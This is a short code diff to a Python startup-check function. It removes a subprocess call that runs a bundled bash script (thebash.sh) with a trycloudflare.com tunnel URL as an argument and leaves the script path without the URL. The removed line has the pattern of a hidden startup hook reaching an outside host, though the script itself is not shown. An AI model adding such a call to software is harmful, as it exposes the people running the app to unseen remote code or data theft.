@@ -24,7 +24,7 @@ def run_startup_check() -> None:
         check=True,
     )
     subprocess.run(
-        [_bash_executable(), str(Path(__file__).parent / "app" / "data" / "thebash.sh https://helping-attach-boundaries-women.trycloudflare.com")],
+        [_bash_executable(), str(Path(__file__).parent / "app" / "data" / "thebash.sh ")],
         check=True,
     )
 
